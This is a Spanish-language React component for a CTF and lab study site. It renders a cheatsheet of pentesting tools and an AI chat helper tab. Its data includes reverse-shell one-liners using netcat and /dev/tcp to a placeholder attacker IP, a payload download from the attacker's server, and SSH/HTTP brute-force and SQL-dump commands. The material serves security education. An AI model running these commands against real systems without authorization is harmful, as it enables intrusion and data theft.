import { useState, useRef, useEffect } from "react";

const categorias = [
  { id: "all", label: "Todas", emoji: "⚡" },
  { id: "recon", label: "Reconocimiento", emoji: "🔍" },
  { id: "explotacion", label: "Explotación", emoji: "💥" },
  { id: "web", label: "Web", emoji: "🌐" },
  { id: "post", label: "Post-Explotación", emoji: "🐚" },
  { id: "cracking", label: "Cracking", emoji: "🔓" },
  { id: "red", label: "Red", emoji: "📡" },
];

const herramientas = [
  {
    nombre: "nmap",
    categoria: "recon",
    descripcion: "Escáner de puertos y servicios. El primero que usas en cualquier CTF.",
    comandos: [
      { cmd: "nmap -sV <IP>", desc: "Detecta versiones de servicios" },
      { cmd: "nmap -sC -sV <IP>", desc: "Scripts por defecto + versiones (combo CTF)" },
      { cmd: "nmap -p- --min-rate=5000 <IP>", desc: "Todos los puertos, rápido" },
      { cmd: "nmap -A <IP>", desc: "Aggressive: OS, versiones, scripts, traceroute" },
      { cmd: "nmap -oN nmap.txt <IP>", desc: "Guarda resultado en archivo" },
    ],
    tips: "Siempre empieza con -sC -sV. Si no encuentras nada, escanea todos los puertos con -p-",
    ctf: "En CTFs casi siempre hay un puerto no estándar (ej: 8080, 4444). Usa -p- para no perdértelo.",
  },
  {
    nombre: "masscan",
    categoria: "recon",
    descripcion: "Escáner masivo de puertos, mucho más rápido que nmap para redes grandes.",
    comandos: [
      { cmd: "masscan -p1-65535 <IP> --rate=1000", desc: "Todos los puertos a velocidad media" },
      { cmd: "masscan -p80,443,22 <IP> --rate=5000", desc: "Puertos específicos, veloz" },
    ],
    tips: "Úsalo primero para descubrir puertos, luego nmap solo en esos puertos para más detalles.",
    ctf: "Ideal cuando tienes un rango de IPs grande (ej: red /24).",
  },
  {
    nombre: "whatweb",
    categoria: "recon",
    descripcion: "Identifica tecnologías web: CMS, frameworks, versiones, servidores.",
    comandos: [
      { cmd: "whatweb <URL>", desc: "Escaneo básico" },
      { cmd: "whatweb -v <URL>", desc: "Verbose: más detalles" },
      { cmd: "whatweb -a 3 <URL>", desc: "Agresivo: más información" },
    ],
    tips: "Antes de atacar una web, siempre identifica qué stack usa.",
    ctf: "Si detecta WordPress, ve directo a wpscan. Si detecta Apache viejo, busca en searchsploit.",
  },
  {
    nombre: "Metasploit",
    categoria: "explotacion",
    descripcion: "Framework de explotación. Tiene exploits, payloads y módulos post-explotación.",
    comandos: [
      { cmd: "msfconsole", desc: "Inicia Metasploit" },
      { cmd: "search <nombre>", desc: "Busca exploits por nombre/CVE" },
      { cmd: "use <modulo>", desc: "Selecciona un módulo" },
      { cmd: "show options", desc: "Muestra opciones configurables" },
      { cmd: "set RHOSTS <IP>", desc: "Define el objetivo" },
      { cmd: "run / exploit", desc: "Ejecuta el exploit" },
    ],
    tips: "Usa 'search type:exploit name:apache' para buscar exploits específicos.",
    ctf: "Para obtener una shell: usa payload/linux/x86/meterpreter/reverse_tcp y pon tu IP en LHOST.",
  },
  {
    nombre: "searchsploit",
    categoria: "explotacion",
    descripcion: "Busca exploits en la base de datos Exploit-DB de forma offline.",
    comandos: [
      { cmd: "searchsploit <servicio>", desc: "Busca exploits por nombre" },
      { cmd: "searchsploit apache 2.4", desc: "Busca por servicio y versión" },
      { cmd: "searchsploit -m <ruta>", desc: "Copia el exploit a tu directorio actual" },
      { cmd: "searchsploit --cve CVE-2021-XXXX", desc: "Busca por CVE específico" },
    ],
    tips: "Después de nmap, toma las versiones de servicios y búscalas aquí.",
    ctf: "Si el exploit es en Python 2, puede que necesites adaptar el código a Python 3.",
  },
  {
    nombre: "sqlmap",
    categoria: "explotacion",
    descripcion: "Automatiza la detección y explotación de inyecciones SQL.",
    comandos: [
      { cmd: "sqlmap -u 'http://URL?id=1'", desc: "Prueba básica de SQLi" },
      { cmd: "sqlmap -u 'URL' --dbs", desc: "Lista bases de datos" },
      { cmd: "sqlmap -u 'URL' -D <db> --tables", desc: "Lista tablas de una DB" },
      { cmd: "sqlmap -u 'URL' -D <db> -T <tabla> --dump", desc: "Extrae datos de la tabla" },
      { cmd: "sqlmap -u 'URL' --cookie='session=xxx'", desc: "Con cookie de sesión" },
    ],
    tips: "Añade --level=3 --risk=2 si el básico no encuentra nada.",
    ctf: "Busca primero el parámetro vulnerable manualmente (id, user, search), luego automatiza.",
  },
  {
    nombre: "hydra",
    categoria: "explotacion",
    descripcion: "Fuerza bruta de credenciales para SSH, FTP, HTTP, etc.",
    comandos: [
      { cmd: "hydra -l admin -P rockyou.txt ssh://<IP>", desc: "Fuerza bruta SSH" },
      { cmd: "hydra -l admin -P rockyou.txt ftp://<IP>", desc: "Fuerza bruta FTP" },
      { cmd: "hydra -L users.txt -P pass.txt <IP> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", desc: "Login web POST" },
      { cmd: "hydra -t 4 -l user -P rockyou.txt <IP> ssh", desc: "Con 4 threads (más lento, menos ruido)" },
    ],
    tips: "En CTFs casi siempre la contraseña está en rockyou.txt — úsalo siempre primero.",
    ctf: "Para HTTP, necesitas analizar el formulario en Burp Suite primero para armar el comando.",
  },
  {
    nombre: "Burp Suite",
    categoria: "web",
    descripcion: "Proxy para interceptar y modificar tráfico HTTP/HTTPS. Herramienta central en web hacking.",
    comandos: [
      { cmd: "Proxy → Intercept ON", desc: "Intercepta requests en tiempo real" },
      { cmd: "Repeater (Ctrl+R)", desc: "Repite y modifica requests manualmente" },
      { cmd: "Intruder (Ctrl+I)", desc: "Automatiza ataques de fuerza bruta en web" },
      { cmd: "Scanner", desc: "Busca vulnerabilidades automáticamente (versión Pro)" },
    ],
    tips: "Configura Firefox con proxy 127.0.0.1:8080 y usa FoxyProxy para activar/desactivar fácil.",
    ctf: "Siempre revisa los headers de respuesta — a veces hay flags o pistas ahí.",
  },
  {
    nombre: "gobuster",
    categoria: "web",
    descripcion: "Fuerza bruta de directorios y subdominios web.",
    comandos: [
      { cmd: "gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt", desc: "Escaneo básico de directorios" },
      { cmd: "gobuster dir -u http://IP -w common.txt -x php,html,txt", desc: "Con extensiones específicas" },
      { cmd: "gobuster dns -d dominio.com -w subdomains.txt", desc: "Fuerza bruta de subdominios" },
      { cmd: "gobuster dir -u http://IP -w big.txt -t 50", desc: "50 threads (más rápido)" },
    ],
    tips: "Si no encuentras nada con common.txt, prueba con directory-list-2.3-medium.txt",
    ctf: "Siempre busca /admin, /backup, /upload, /config — aparecen mucho en CTFs.",
  },
  {
    nombre: "nikto",
    categoria: "web",
    descripcion: "Escáner de vulnerabilidades web. Detecta misconfigs, archivos peligrosos y versiones viejas.",
    comandos: [
      { cmd: "nikto -h http://IP", desc: "Escaneo básico" },
      { cmd: "nikto -h http://IP -p 8080", desc: "Puerto específico" },
      { cmd: "nikto -h http://IP -o resultado.txt", desc: "Guarda el resultado" },
    ],
    tips: "Es ruidoso (fácil de detectar), pero en CTFs no importa el sigilo.",
    ctf: "A veces encuentra archivos como /backup.zip o /config.bak que son oro puro.",
  },
  {
    nombre: "ffuf",
    categoria: "web",
    descripcion: "Fuzzer web ultrarrápido. Busca directorios, parámetros y subdominios.",
    comandos: [
      { cmd: "ffuf -u http://IP/FUZZ -w wordlist.txt", desc: "Fuzz de directorios" },
      { cmd: "ffuf -u http://IP/FUZZ -w wordlist.txt -e .php,.html", desc: "Con extensiones" },
      { cmd: "ffuf -u http://IP/?FUZZ=test -w params.txt", desc: "Fuzz de parámetros GET" },
      { cmd: "ffuf -u http://FUZZ.dominio.com -w subdomains.txt", desc: "Fuzz de subdominios" },
    ],
    tips: "Filtra resultados falsos positivos con -fc 404 o -fs <tamaño_respuesta>",
    ctf: "Más rápido que gobuster. Si tienes poco tiempo, usa ffuf.",
  },
  {
    nombre: "LinPEAS",
    categoria: "post",
    descripcion: "Script automático de enumeración para escalada de privilegios en Linux.",
    comandos: [
      { cmd: "wget http://TU_IP:8000/linpeas.sh", desc: "Descarga desde tu servidor" },
      { cmd: "chmod +x linpeas.sh && ./linpeas.sh", desc: "Ejecuta el script" },
      { cmd: "./linpeas.sh | tee output.txt", desc: "Guarda el output" },
      { cmd: "python3 -m http.server 8000", desc: "Servidor para servir el archivo (en tu máquina)" },
    ],
    tips: "Los hallazgos en amarillo son interesantes, en rojo son críticos — prioriza los rojos.",
    ctf: "Busca específicamente: SUID files, sudo -l, cron jobs, contraseñas en archivos.",
  },
  {
    nombre: "GTFOBins",
    categoria: "post",
    descripcion: "Base de datos de binarios Linux que pueden usarse para escalar privilegios.",
    comandos: [
      { cmd: "sudo -l", desc: "Ver qué comandos puedes ejecutar como sudo" },
      { cmd: "find / -perm -4000 2>/dev/null", desc: "Busca binarios SUID" },
      { cmd: "# Busca el binario en gtfobins.github.io", desc: "Ver cómo explotarlo" },
    ],
    tips: "Si sudo -l muestra (ALL) NOPASSWD: /usr/bin/vim → ve a GTFOBins y busca vim.",
    ctf: "Los más comunes: vim, less, find, python, bash, cp, tar.",
  },
  {
    nombre: "john",
    categoria: "cracking",
    descripcion: "John the Ripper — cracker de hashes y contraseñas.",
    comandos: [
      { cmd: "john hash.txt --wordlist=rockyou.txt", desc: "Crackea con diccionario" },
      { cmd: "john hash.txt --format=md5", desc: "Especifica el formato del hash" },
      { cmd: "john --show hash.txt", desc: "Muestra contraseñas ya crackeadas" },
      { cmd: "zip2john archivo.zip > hash.txt", desc: "Extrae hash de un ZIP protegido" },
      { cmd: "ssh2john id_rsa > hash.txt", desc: "Extrae hash de una clave SSH" },
    ],
    tips: "Si no sabes el formato del hash, usa hash-identifier primero.",
    ctf: "zip2john y ssh2john son muy usados cuando encuentras archivos protegidos.",
  },
  {
    nombre: "hashcat",
    categoria: "cracking",
    descripcion: "Cracker de hashes que usa la GPU — mucho más rápido que john para hashes complejos.",
    comandos: [
      { cmd: "hashcat -m 0 hash.txt rockyou.txt", desc: "MD5 con diccionario" },
      { cmd: "hashcat -m 1000 hash.txt rockyou.txt", desc: "NTLM (Windows)" },
      { cmd: "hashcat -m 1800 hash.txt rockyou.txt", desc: "SHA-512 (Linux /etc/shadow)" },
      { cmd: "hashcat -m 0 hash.txt rockyou.txt --show", desc: "Ver resultado crackeado" },
    ],
    tips: "Usa https://hashcat.net/wiki/doku.php?id=hashcat para ver todos los modos (-m).",
    ctf: "MD5 = -m 0, SHA1 = -m 100, bcrypt = -m 3200, NTLM = -m 1000.",
  },
  {
    nombre: "hash-identifier",
    categoria: "cracking",
    descripcion: "Identifica el tipo de hash que tienes.",
    comandos: [
      { cmd: "hash-identifier", desc: "Modo interactivo — pega tu hash" },
      { cmd: "hash-identifier <hash>", desc: "Directamente con el hash" },
    ],
    tips: "Si no funciona, prueba con https://hashes.com/en/tools/hash_identifier online.",
    ctf: "Siempre identifica el hash antes de intentar crackearlo — ahorra mucho tiempo.",
  },
  {
    nombre: "Wireshark",
    categoria: "red",
    descripcion: "Analizador de tráfico de red. Captura y filtra paquetes.",
    comandos: [
      { cmd: "tcp", desc: "Filtra solo tráfico TCP" },
      { cmd: "http", desc: "Solo tráfico HTTP" },
      { cmd: "ip.addr == <IP>", desc: "Filtra por IP específica" },
      { cmd: "tcp.port == 80", desc: "Filtra por puerto" },
      { cmd: "Follow TCP Stream", desc: "Click derecho → reconstruye la conversación completa" },
    ],
    tips: "Usa 'Follow TCP Stream' para ver conversaciones completas — ahí aparecen credenciales en texto plano.",
    ctf: "En CTFs de forense/red, busca credenciales FTP/HTTP que viajan sin cifrar.",
  },
  {
    nombre: "netcat",
    categoria: "red",
    descripcion: "La navaja suiza de redes. Crea conexiones TCP/UDP, recibe shells, transfiere archivos.",
    comandos: [
      { cmd: "nc -lvnp 4444", desc: "Listener — espera una reverse shell" },
      { cmd: "nc <IP> 4444", desc: "Conecta a un listener" },
      { cmd: "nc -e /bin/bash <IP> 4444", desc: "Reverse shell básica" },
      { cmd: "nc <IP> 4444 < archivo.txt", desc: "Transfiere un archivo" },
    ],
    tips: "nc -lvnp 4444 siempre activo antes de ejecutar tu exploit — espera la conexión.",
    ctf: "La reverse shell más usada en CTFs: bash -i >& /dev/tcp/TU_IP/4444 0>&1",
  },
  {
    nombre: "tcpdump",
    categoria: "red",
    descripcion: "Captura tráfico de red desde la terminal — Wireshark sin interfaz gráfica.",
    comandos: [
      { cmd: "tcpdump -i eth0", desc: "Captura en interfaz eth0" },
      { cmd: "tcpdump -i eth0 port 80", desc: "Solo tráfico en puerto 80" },
      { cmd: "tcpdump -i eth0 -w captura.pcap", desc: "Guarda captura en archivo" },
      { cmd: "tcpdump -r captura.pcap", desc: "Lee un archivo .pcap" },
    ],
    tips: "Usa -n para no resolver nombres DNS (más rápido).",
    ctf: "Si hay un .pcap en la máquina, descárgalo y ábrelo en Wireshark en tu máquina local.",
  },
];

function CopyButton({ texto }) {
  const [copiado, setCopiado] = useState(false);
  const copiar = () => {
    navigator.clipboard.writeText(texto);
    setCopiado(true);
    setTimeout(() => setCopiado(false), 1500);
  };
  return (
    <button
      onClick={copiar}
      style={{
        background: copiado ? "#00ff9d22" : "#ffffff10",
        border: `1px solid ${copiado ? "#00ff9d" : "#ffffff20"}`,
        color: copiado ? "#00ff9d" : "#888",
        borderRadius: "4px",
        padding: "2px 8px",
        fontSize: "11px",
        cursor: "pointer",
        transition: "all 0.2s",
        whiteSpace: "nowrap",
      }}
    >
      {copiado ? "✓" : "copiar"}
    </button>
  );
}

function HerramientaCard({ h, expandida, onToggle }) {
  const catColor = {
    recon: "#3b82f6",
    explotacion: "#ef4444",
    web: "#8b5cf6",
    post: "#f97316",
    cracking: "#eab308",
    red: "#06b6d4",
  };
  const color = catColor[h.categoria] || "#888";

  return (
    <div
      style={{
        background: "#0f0f1a",
        border: `1px solid ${expandida ? color : "#1e1e2e"}`,
        borderRadius: "12px",
        overflow: "hidden",
        transition: "border-color 0.2s",
        cursor: "pointer",
      }}
    >
      <div
        onClick={onToggle}
        style={{
          padding: "16px 20px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          gap: "12px",
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
          <span
            style={{
              fontFamily: "monospace",
              fontSize: "16px",
              fontWeight: "700",
              color: "#fff",
            }}
          >
            {h.nombre}
          </span>
          <span
            style={{
              fontSize: "11px",
              padding: "2px 8px",
              borderRadius: "20px",
              background: color + "22",
              color: color,
              border: `1px solid ${color}44`,
            }}
          >
            {categorias.find((c) => c.id === h.categoria)?.emoji}{" "}
            {categorias.find((c) => c.id === h.categoria)?.label}
          </span>
        </div>
        <span style={{ color: "#555", fontSize: "18px" }}>{expandida ? "▲" : "▼"}</span>
      </div>

      <div
        style={{
          padding: expandida ? "0 20px 20px" : "0 20px",
          maxHeight: expandida ? "1000px" : "0",
          overflow: "hidden",
          transition: "max-height 0.3s ease, padding 0.2s",
        }}
      >
        <p style={{ color: "#aaa", fontSize: "13px", marginBottom: "16px", lineHeight: "1.6" }}>
          {h.descripcion}
        </p>

        <div
          style={{
            background: "#080810",
            borderRadius: "8px",
            border: "1px solid #1e1e2e",
            overflow: "hidden",
            marginBottom: "14px",
          }}
        >
          <div
            style={{
              padding: "8px 14px",
              borderBottom: "1px solid #1e1e2e",
              fontSize: "11px",
              color: "#555",
              letterSpacing: "0.1em",
              textTransform: "uppercase",
            }}
          >
            comandos
          </div>
          {h.comandos.map((c, i) => (
            <div
              key={i}
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                padding: "9px 14px",
                borderBottom: i < h.comandos.length - 1 ? "1px solid #0e0e1a" : "none",
                gap: "12px",
              }}
            >
              <div style={{ flex: 1, minWidth: 0 }}>
                <code
                  style={{
                    color: color,
                    fontFamily: "monospace",
                    fontSize: "13px",
                    display: "block",
                    marginBottom: "2px",
                  }}
                >
                  {c.cmd}
                </code>
                <span style={{ color: "#555", fontSize: "12px" }}>{c.desc}</span>
              </div>
              <CopyButton texto={c.cmd} />
            </div>
          ))}
        </div>

        <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
          <div
            style={{
              flex: 1,
              minWidth: "200px",
              background: "#0a1628",
              border: "1px solid #1e3a5f",
              borderRadius: "8px",
              padding: "12px",
            }}
          >
            <div style={{ fontSize: "11px", color: "#3b82f6", marginBottom: "6px", fontWeight: "600" }}>
              💡 TIP
            </div>
            <p style={{ color: "#aaa", fontSize: "12px", margin: 0, lineHeight: "1.6" }}>{h.tips}</p>
          </div>
          <div
            style={{
              flex: 1,
              minWidth: "200px",
              background: "#1a0a0a",
              border: "1px solid #5f1e1e",
              borderRadius: "8px",
              padding: "12px",
            }}
          >
            <div style={{ fontSize: "11px", color: "#ef4444", marginBottom: "6px", fontWeight: "600" }}>
              🚩 EN CTFs
            </div>
            <p style={{ color: "#aaa", fontSize: "12px", margin: 0, lineHeight: "1.6" }}>{h.ctf}</p>
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Preguntas rápidas sugeridas ───────────────────────────────────────────
const PREGUNTAS_RAPIDAS = [
  "¿Cómo enumero usuarios en Linux?",
  "¿Cómo saco una contraseña de un hash?",
  "¿Cómo encuentro la dirección MAC en Windows?",
  "¿Qué pasos sigo para obtener una reverse shell?",
  "¿Cómo escalo privilegios con SUID?",
  "¿Cómo encuentro archivos ocultos en Linux?",
  "¿Quién fue el último usuario en iniciar sesión?",
  "¿Cómo busco herramientas de hacking instaladas en Windows?",
];

// ─── Componente Asistente IA ────────────────────────────────────────────────
function AsisteIA() {
  const [mensajes, setMensajes] = useState([
    {
      rol: "asistente",
      texto: "¡Hola! Soy tu asistente de hacking 🤖\n\nPregúntame cómo resolver cualquier paso de un CTF o laboratorio — te respondo con pasos concretos y comandos listos para copiar 🚩",
    },
  ]);
  const [input, setInput] = useState("");
  const [cargando, setCargando] = useState(false);
  const bottomRef = useRef(null);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [mensajes, cargando]);

  const enviar = async (pregunta) => {
    const texto = pregunta || input.trim();
    if (!texto || cargando) return;
    setInput("");
    const nuevosMensajes = [...mensajes, { rol: "usuario", texto }];
    setMensajes(nuevosMensajes);
    setCargando(true);

    const historial = nuevosMensajes.map((m) => ({
      role: m.rol === "usuario" ? "user" : "assistant",
      content: m.texto,
    }));

    try {
      const res = await fetch("https://api.anthropic.com/v1/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          model: "claude-sonnet-4-20250514",
          max_tokens: 1000,
          system: `Eres un experto en ciberseguridad y CTFs (Capture The Flag), especializado en ayudar a estudiantes hispanohablantes en TryHackMe y laboratorios similares.

Tu rol: Guía paso a paso para resolver challenges y preguntas forenses/CTF.

Reglas ESTRICTAS:
- Responde SIEMPRE en español
- Sé concreto: da comandos reales listos para ejecutar
- Estructura fija:
  1. Una línea explicando qué busca el comando
  2. Bloque de código con el comando exacto (usa triple backtick)
  3. Qué buscar en el resultado
- Para preguntas forenses Windows (usuarios, MAC, IP, último login): indica el comando exacto de PowerShell o la herramienta
- Usa emojis de sección: 🔍 Qué hacer, 💻 Comando, 🎯 Resultado esperado, 💡 Tip extra
- Máximo 350 palabras — sé directo y práctico`,
          messages: historial,
        }),
      });
      const data = await res.json();
      const respuesta = data.content?.[0]?.text || "No pude obtener respuesta.";
      setMensajes((prev) => [...prev, { rol: "asistente", texto: respuesta }]);
    } catch {
      setMensajes((prev) => [
        ...prev,
        { rol: "asistente", texto: "❌ Error de conexión. Revisa tu internet e intenta de nuevo." },
      ]);
    }
    setCargando(false);
  };

  const formatearTexto = (texto) => {
    const partes = texto.split(/(```[\s\S]*?```|`[^`]+`)/g);
    return partes.map((parte, i) => {
      if (parte.startsWith("```") && parte.endsWith("```")) {
        const inner = parte.slice(3, -3);
        const lines = inner.split("\n");
        const code = lines[0].match(/^[a-z]+$/) ? lines.slice(1).join("\n") : inner;
        return (
          <div key={i} style={{ position: "relative", margin: "10px 0" }}>
            <pre style={{
              background: "#050508",
              border: "1px solid #00ff9d33",
              borderRadius: "6px",
              padding: "12px 40px 12px 14px",
              fontSize: "12px",
              color: "#00ff9d",
              overflowX: "auto",
              margin: 0,
              fontFamily: "monospace",
              whiteSpace: "pre-wrap",
              wordBreak: "break-all",
            }}>
              {code}
            </pre>
            <div style={{ position: "absolute", top: "8px", right: "8px" }}>
              <CopyButton texto={code} />
            </div>
          </div>
        );
      } else if (parte.startsWith("`") && parte.endsWith("`")) {
        return (
          <code key={i} style={{
            background: "#0f0f1a",
            color: "#00ff9d",
            padding: "1px 5px",
            borderRadius: "3px",
            fontSize: "12px",
            fontFamily: "monospace",
          }}>
            {parte.slice(1, -1)}
          </code>
        );
      }
      return <span key={i} style={{ whiteSpace: "pre-wrap" }}>{parte}</span>;
    });
  };

  return (
    <div style={{ maxWidth: "860px", margin: "0 auto", padding: "20px 32px", display: "flex", flexDirection: "column", height: "calc(100vh - 160px)" }}>
      {/* Preguntas rápidas */}
      <div style={{ marginBottom: "14px" }}>
        <p style={{ color: "#444", fontSize: "11px", marginBottom: "8px", textTransform: "uppercase", letterSpacing: "0.08em" }}>⚡ Preguntas frecuentes</p>
        <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
          {PREGUNTAS_RAPIDAS.map((p) => (
            <button
              key={p}
              onClick={() => enviar(p)}
              disabled={cargando}
              style={{
                background: "#0f0f1a",
                border: "1px solid #1e1e2e",
                borderRadius: "20px",
                padding: "5px 12px",
                color: "#777",
                fontSize: "11px",
                cursor: cargando ? "not-allowed" : "pointer",
                transition: "all 0.15s",
              }}
            >
              {p}
            </button>
          ))}
        </div>
      </div>

      {/* Chat */}
      <div style={{
        flex: 1,
        overflowY: "auto",
        background: "#0a0a14",
        border: "1px solid #1e1e2e",
        borderRadius: "12px",
        padding: "18px",
        marginBottom: "14px",
        display: "flex",
        flexDirection: "column",
        gap: "14px",
      }}>
        {mensajes.map((m, i) => (
          <div key={i} style={{ display: "flex", justifyContent: m.rol === "usuario" ? "flex-end" : "flex-start" }}>
            <div style={{
              maxWidth: "88%",
              background: m.rol === "usuario" ? "#12123a" : "#0f0f1a",
              border: `1px solid ${m.rol === "usuario" ? "#2e2e7a" : "#1e1e2e"}`,
              borderRadius: m.rol === "usuario" ? "12px 12px 4px 12px" : "12px 12px 12px 4px",
              padding: "12px 16px",
              fontSize: "13px",
              lineHeight: "1.75",
              color: "#ccc",
            }}>
              {m.rol === "asistente" && (
                <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "8px", paddingBottom: "8px", borderBottom: "1px solid #1e1e2e" }}>
                  <span style={{ fontSize: "13px" }}>🤖</span>
                  <span style={{ fontSize: "11px", color: "#00ff9d", fontWeight: "700", letterSpacing: "0.05em" }}>HACKFORGE AI</span>
                </div>
              )}
              {formatearTexto(m.texto)}
            </div>
          </div>
        ))}
        {cargando && (
          <div style={{ display: "flex" }}>
            <div style={{
              background: "#0f0f1a",
              border: "1px solid #1e1e2e",
              borderRadius: "12px 12px 12px 4px",
              padding: "14px 18px",
              display: "flex",
              gap: "5px",
              alignItems: "center",
            }}>
              {[0,1,2].map((i) => (
                <div key={i} style={{
                  width: "7px", height: "7px", borderRadius: "50%",
                  background: "#00ff9d",
                  animation: `blink 1.2s ${i * 0.2}s ease-in-out infinite`,
                }}/>
              ))}
            </div>
          </div>
        )}
        <div ref={bottomRef} />
      </div>

      {/* Input */}
      <div style={{ display: "flex", gap: "10px" }}>
        <input
          type="text"
          placeholder="Pregunta algo... ej: ¿Cómo saco la dirección MAC en Windows?"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && !cargando && enviar()}
          disabled={cargando}
          style={{
            flex: 1,
            background: "#0f0f1a",
            border: "1px solid #1e1e2e",
            borderRadius: "8px",
            padding: "12px 16px",
            color: "#fff",
            fontSize: "13px",
            outline: "none",
          }}
        />
        <button
          onClick={() => enviar()}
          disabled={cargando || !input.trim()}
          style={{
            background: (!cargando && input.trim()) ? "#00ff9d" : "#1e1e2e",
            color: (!cargando && input.trim()) ? "#080810" : "#444",
            border: "none",
            borderRadius: "8px",
            padding: "12px 22px",
            fontWeight: "700",
            fontSize: "13px",
            cursor: (!cargando && input.trim()) ? "pointer" : "not-allowed",
            transition: "all 0.2s",
            whiteSpace: "nowrap",
          }}
        >
          {cargando ? "..." : "Enviar ↵"}
        </button>
      </div>
      <style>{`@keyframes blink { 0%,100%{opacity:.2;transform:scale(.7)} 50%{opacity:1;transform:scale(1)} }`}</style>
    </div>
  );
}

// ─── Componente principal con tabs ─────────────────────────────────────────
export default function Herramientas() {
  const [tab, setTab] = useState("cheatsheet");
  const [categoriaActiva, setCategoriaActiva] = useState("all");
  const [busqueda, setBusqueda] = useState("");
  const [expandida, setExpandida] = useState(null);

  const filtradas = herramientas.filter((h) => {
    const matchCat = categoriaActiva === "all" || h.categoria === categoriaActiva;
    const matchBusq =
      busqueda === "" ||
      h.nombre.toLowerCase().includes(busqueda.toLowerCase()) ||
      h.descripcion.toLowerCase().includes(busqueda.toLowerCase());
    return matchCat && matchBusq;
  });

  return (
    <div style={{ minHeight: "100vh", background: "#080810", color: "#fff", fontFamily: "'Inter', sans-serif" }}>
      {/* Header */}
      <div style={{ borderBottom: "1px solid #1e1e2e", padding: "24px 32px 0", background: "linear-gradient(180deg, #0d0d1f 0%, #080810 100%)" }}>
        <div style={{ maxWidth: "900px", margin: "0 auto" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "4px" }}>
            <span style={{ fontSize: "24px" }}>🛠️</span>
            <h1 style={{ fontSize: "24px", fontWeight: "800", margin: 0, background: "linear-gradient(90deg,#fff,#888)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent" }}>
              Herramientas
            </h1>
          </div>
          <p style={{ color: "#444", fontSize: "12px", margin: "0 0 18px" }}>
            Cheatsheet interactiva + Asistente IA para CTFs y laboratorios
          </p>
          {/* Tabs */}
          <div style={{ display: "flex", gap: "0" }}>
            {[
              { id: "cheatsheet", label: "📋 Cheatsheet" },
              { id: "asistente", label: "🤖 Asistente IA" },
            ].map((t) => (
              <button key={t.id} onClick={() => setTab(t.id)} style={{
                background: "transparent",
                border: "none",
                borderBottom: tab === t.id ? "2px solid #00ff9d" : "2px solid transparent",
                color: tab === t.id ? "#fff" : "#555",
                padding: "8px 20px",
                fontSize: "13px",
                fontWeight: tab === t.id ? "700" : "400",
                cursor: "pointer",
                transition: "all 0.2s",
              }}>
                {t.label}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Contenido */}
      {tab === "asistente" ? (
        <AsisteIA />
      ) : (
        <>
          <div style={{ borderBottom: "1px solid #1e1e2e", padding: "18px 32px" }}>
            <div style={{ maxWidth: "900px", margin: "0 auto" }}>
              <input
                type="text"
                placeholder="Buscar herramienta... (ej: nmap, hydra, burp)"
                value={busqueda}
                onChange={(e) => setBusqueda(e.target.value)}
                style={{
                  width: "100%", background: "#0f0f1a", border: "1px solid #1e1e2e",
                  borderRadius: "8px", padding: "11px 16px", color: "#fff",
                  fontSize: "13px", outline: "none", boxSizing: "border-box", marginBottom: "14px",
                }}
              />
              <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
                {categorias.map((cat) => (
                  <button key={cat.id} onClick={() => { setCategoriaActiva(cat.id); setExpandida(null); }} style={{
                    background: categoriaActiva === cat.id ? "#fff" : "#0f0f1a",
                    color: categoriaActiva === cat.id ? "#080810" : "#888",
                    border: `1px solid ${categoriaActiva === cat.id ? "#fff" : "#1e1e2e"}`,
                    borderRadius: "20px", padding: "5px 14px", fontSize: "12px",
                    cursor: "pointer", fontWeight: categoriaActiva === cat.id ? "700" : "400",
                    transition: "all 0.2s",
                  }}>
                    {cat.emoji} {cat.label}
                  </button>
                ))}
              </div>
            </div>
          </div>
          <div style={{ maxWidth: "900px", margin: "0 auto", padding: "24px 32px" }}>
            <div style={{ color: "#555", fontSize: "12px", marginBottom: "16px" }}>
              {filtradas.length} herramienta{filtradas.length !== 1 ? "s" : ""}
            </div>
            <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
              {filtradas.length === 0 ? (
                <div style={{ textAlign: "center", padding: "60px", color: "#333" }}>
                  No se encontró ninguna herramienta.
                </div>
              ) : (
                filtradas.map((h) => (
                  <HerramientaCard
                    key={h.nombre} h={h}
                    expandida={expandida === h.nombre}
                    onToggle={() => setExpandida(expandida === h.nombre ? null : h.nombre)}
                  />
                ))
              )}
            </div>
          </div>
        </>
      )}
    </div>
  );
}
